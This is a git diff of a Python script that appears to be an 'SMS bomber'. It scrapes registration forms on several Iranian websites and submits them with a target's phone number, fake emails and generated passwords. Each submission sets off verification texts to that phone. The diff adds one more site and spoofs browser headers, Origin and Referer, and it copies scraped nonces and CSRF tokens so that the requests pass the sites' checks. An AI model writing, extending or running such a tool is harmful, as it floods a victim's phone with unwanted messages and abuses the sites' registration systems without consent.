@@ -29,36 +29,51 @@ class Base:
         ]
 
         self.session = requests.Session()
-        self.session.headers.update({
+        self.headers = {
             "User-Agent": random.choice(self.user_agents),
-            "Content-Type": "application/x-www-form-urlencoded"
-        })
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "X-Requested-With": "XMLHttpRequest",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Cache-Control": "no-cache",
+            "Connection": "keep-alive"
+        }
+        
+        # self.session.headers.update({
+        #     "Origin": "https://www.vidomart.shop",
+        #     "Referer": "https://www.vidomart.shop/register"
+        # })
 
     def split_number_with_plus(self, number_str: str) -> str:
         # فرض می‌کنیم شماره رو می‌خوای به سه بخش تقسیم کنی
         # اینجا مثال: 3 رقم اول + 3 رقم بعدی + بقیه
-        number_str = number_str.replace('09', '9')
+        number_str = number_str.replace("09", "9")
         part1 = number_str[0:3]
         part2 = number_str[3:6]
         part3 = number_str[6:]
         return f"{part1}+{part2}+{part3}"
 
-    def post(self, url, data, save=False):
+    def post(self, url, data, save=False, headers=None):
         try:
             site = urlparse(url).netloc
-            r = self.session.post(url, data=data)
+
+            # اگر هدر خاصی پاس داده نشده بود، هدرهای پیش‌فرض مرورگر رو بذار
+            if headers is None:
+                headers = self.headers
+
+            # ارسال درخواست با session (کوکی‌ها از مرحله GET ذخیره شده‌اند)
+            r = self.session.post(url, data=data, headers=headers)
+
             if r.ok:
-                print_success(f"{site} will send sms for")
+                print_success(f"{site} -> SMS request sent successfully")
             else:
-                print_error(
-                    f"{site} -> something went wrong ({r.status_code})"
-                )
+                print_error(f"{site} -> something went wrong ({r.status_code})")
                 
             if save:
                 self.save(r.text)
                                 
         except Exception as e:
-            print_error(f"can not send data to {url}")
+            print_error(f"can not send data to {url} -> {e}")
 
     def save(self, data):
         with open("temp.html", mode="w", encoding="utf-8") as file:
@@ -160,10 +175,10 @@ class Register(Base):
 
             data["mobile_user"] = self.phone
             data["user_email"] = self.unique_email()
-            data["term"] = 'ok'
-            
-            url = 'https://cafeamuzesh.com/?ums-ajax=ums_register_form'
-            
+            data["term"] = "ok"
+
+            url = "https://cafeamuzesh.com/?ums-ajax=ums_register_form"
+
             self.post(url, data)
 
         except Exception as e:
@@ -235,10 +250,10 @@ class Register(Base):
             data["password"] = self.generate_strong_password()
             data["mobile"] = self.phone
             data["action"] = "dotline_ajax_register"
-            data["privacy"] = '1'
-            data["token"] = ''
-            data["security"] = data.get('dotline-register-security', '')
-            
+            data["privacy"] = "1"
+            data["token"] = ""
+            data["security"] = data.get("dotline-register-security", "")
+
             url = "https://learnfiles.com/wp-admin/admin-ajax.php"
 
             self.post(url, data)
@@ -253,9 +268,7 @@ class Register(Base):
             if not soup:
                 return
 
-            form = soup.find(
-                "form", attrs={'id': 'verificationform'}
-            )
+            form = soup.find("form", attrs={"id": "verificationform"})
             inputs = form.find_all("input")
 
             data = self.set_input_to_data(inputs)
@@ -263,13 +276,13 @@ class Register(Base):
             data["mobile"] = self.phone
             data["formid"] = "registerform"
             data["eferer"] = "/wp-login.php?action=register"
-            
-            url = 'https://abzarwp.com/wp-admin/admin-ajax.php'
+
+            url = "https://abzarwp.com/wp-admin/admin-ajax.php"
             self.post(url, data)
 
         except Exception as e:
             print_error(f"Error abzarwp -> {e}")
-            
+
     def digistyle(self):
         try:
             url = "https://www.digistyle.com/users/login-register/"
@@ -277,59 +290,55 @@ class Register(Base):
             if not soup:
                 return
 
-            form = soup.find(
-                "form"
-            )
+            form = soup.find("form")
             inputs = form.find_all("input")
 
             data = self.set_input_to_data(inputs)
-            
+
             data["loginRegister[email_phone]"] = self.phone
-            
+
             self.post(url, data)
 
         except Exception as e:
             print_error(f"Error digistyle -> {e}")
-            
+
     def vidomart(self):
         def find_nonce_key():
-            text = str(soup.find('script', attrs={'id': 'master-script-js-before'}))
+            text = str(soup.find("script", attrs={"id": "master-script-js-before"}))
             if text:
                 match = re.search(r'ajaxnonce:\s*"([a-zA-Z0-9]+)"', text)
                 if match:
                     nonce_value = match.group(1)
-                    return nonce_value 
-            return ''
-        
+                    return nonce_value
+            return ""
+
         try:
             url = "https://www.vidomart.shop/login/"
             soup = self.get(url)
             if not soup:
                 return
 
-            form = soup.find(
-                "div", attrs={'class': "register-form"}
-            )
+            form = soup.find("div", attrs={"class": "register-form"})
             inputs = form.find_all("input")
 
             data = self.set_input_to_data(inputs)
-            
+
             data["mobile"] = self.phone
             data["password"] = self.generate_strong_password()
             data["email"] = self.unique_email()
             data["name"] = self.unique_username()
             data["family"] = self.unique_username()
-            data["userType"] = 'requester'
+            data["userType"] = "requester"
             data["nonce_key"] = find_nonce_key()
-            data["action"] = 'register_with_ajax'
-            
-            url = 'https://www.vidomart.shop/wp-admin/admin-ajax.php'
-            
+            data["action"] = "register_with_ajax"
+
+            url = "https://www.vidomart.shop/wp-admin/admin-ajax.php"
+
             self.post(url, data)
 
         except Exception as e:
             print_error(f"Error vidomart -> {e}")
-    
+
     def mohammadfarshadian(self):
         try:
             url = "https://mohammadfarshadian.com/"
@@ -337,34 +346,33 @@ class Register(Base):
             if not soup:
                 return
 
-            form = soup.find(
-                "form", attrs={'class':'digits_register'}
-            )
+            form = soup.find("form", attrs={"class": "digits_register"})
             inputs = form.find_all("input")
 
             data = self.set_input_to_data(inputs)
 
             email = self.unique_email()
-            data["action"] = 'digits_check_mob'
-            data["countrycode"] = '+98'
+            data["action"] = "digits_check_mob"
+            data["countrycode"] = "+98"
             data["mobileNo"] = self.split_number_with_plus(self.phone)
-            data["csrf"] = form.find('input', attrs={'name': 'dig_nounce'}).get('value', '')
+            data["csrf"] = form.find("input", attrs={"name": "dig_nounce"}).get(
+                "value", ""
+            )
             data["login"] = 2
-            data["username"] = ''
+            data["username"] = ""
             data["email"] = email
-            data["dig_nounce"] = email.split('@')[0]
+            data["dig_nounce"] = email.split("@")[0]
             data["mobmail2"] = email
             data["dig_reg_mail"] = email
-            data["captcha_ses"] = ''
-            data["captcha"] = ''
+            data["captcha_ses"] = ""
+            data["captcha"] = ""
             data["digits"] = 1
             data["whatsapp"] = 0
             data["json"] = 1
             data["digits_reg_mail"] = self.split_number_with_plus(self.phone)
             data["digits_reg_password"] = self.generate_strong_password()
 
-            
-            url = 'https://mohammadfarshadian.com/wp-admin/admin-ajax.php'
+            url = "https://mohammadfarshadian.com/wp-admin/admin-ajax.php"
             self.post(url, data)
 
         except Exception as e:
@@ -377,14 +385,14 @@ class Register(Base):
             if not soup:
                 return
 
-            form = soup.find("form", attrs={'id':'checkfornewentertosite'})
+            form = soup.find("form", attrs={"id": "checkfornewentertosite"})
             inputs = form.find_all("input")
 
             data = self.set_input_to_data(inputs)
 
             data["form[username]"] = self.phone
-            url = urljoin(url, form.get('action'))
-            
+            url = urljoin(url, form.get("action"))
+
             print(url)
             print(data)
             # https://numberland.ir/ajax_login.php
@@ -405,23 +413,52 @@ class Register(Base):
             if not soup:
                 return
 
-            form = soup.find("form", attrs={'class': 'register'})
+            form = soup.find("form", attrs={"class": "register"})
             inputs = form.find_all("input")
 
             data = self.set_input_to_data(inputs)
 
-            data["phone"] = self.phone.replace('09', '9')
+            data["phone"] = self.phone.replace("09", "9")
             data["digits_reg_name"] = self.unique_username()
             data["digits_reg_lastname"] = self.unique_username()
             data["email"] = self.unique_email()
-            
-            url = 'https://irankargah.com/wp-admin/admin-ajax.php'
-            
-            self.post(url, data, True)
-            
+
+            url = "https://irankargah.com/wp-admin/admin-ajax.php"
+
+            self.post(url, data)
+
         except Exception as e:
             print_error(f"Error irankargah -> {e}")
-      
+
+    def startabad(self):
+        try:
+            url = "https://startabad.com/student-panel/?action=register"
+            soup = self.get(url)
+            if not soup:
+                return
+            form = soup.find("form", attrs={"class": "register"})
+            inputs = form.find_all("input")
+
+            data = self.set_input_to_data(inputs)
+
+            data["email"] = self.unique_email()
+            data["phone"] = self.phone.replace('09', '9')
+            data["digits_reg_lastname"] = self.unique_username()
+            data["digits_reg_name"] = self.unique_username()
+            data["digits_reg_password"] = self.generate_strong_password()
+            
+            url = 'https://startabad.com/wp-admin/admin-ajax.php'
+            
+            header = self.headers.copy()
+            header.update({
+                "Origin": "https://startabad.com",
+                "Referer": "https://startabad.com/?login=true&redirect_to=https%3A%2F%2Fstartabad.com%2Fstudent-panel%2F%3Faction%3Dregister&page=2"
+            })
+            
+            self.post(url, data, headers=header)
+        except Exception as e:
+            print_error(f"Error startabad -> {e}")
+
     def start(self):
         # self.digikala()
         # self.rcs()
@@ -433,11 +470,12 @@ class Register(Base):
         # self.vidomart()
         # self.cafeamuzesh()
         # self.mohammadfarshadian()
-        
-        
+
         # have changes
         # self.numberland()
-        
+
         # every things are ok but sms will not send
         # self.irankargah()
-        self
+        self.startabad()
+        
+        
